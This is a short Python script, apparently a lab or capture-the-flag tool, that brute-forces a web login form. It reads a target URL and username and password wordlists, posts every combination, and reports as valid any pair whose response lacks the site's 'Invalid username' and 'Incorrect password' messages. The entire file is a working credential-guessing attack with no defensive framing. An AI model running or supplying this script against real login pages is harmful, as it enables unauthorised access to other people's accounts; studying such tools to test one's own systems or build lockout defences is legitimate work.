#!/usr/bin/python3
import requests

url=input("Target URL: ")
usersFile=input("Users List: ")
passwdsFile=input("Passowrds List: ")

with open(usersFile, 'r') as f:
    usersList = f.read().splitlines()

with open(passwdsFile, 'r') as f:
    passwdsList = f.read().splitlines()

for user in usersList:
    for passwd in passwdsList:
        session = requests.Session()
        creds = {'username': f'{user}', 'password':f'{passwd}'}
        response = session.post(url, data=creds)
        if ('Invalid username' not in response.text) and ('Incorrect password' not in response.text):
            print(f"[!] VALID → {user}:{passwd}")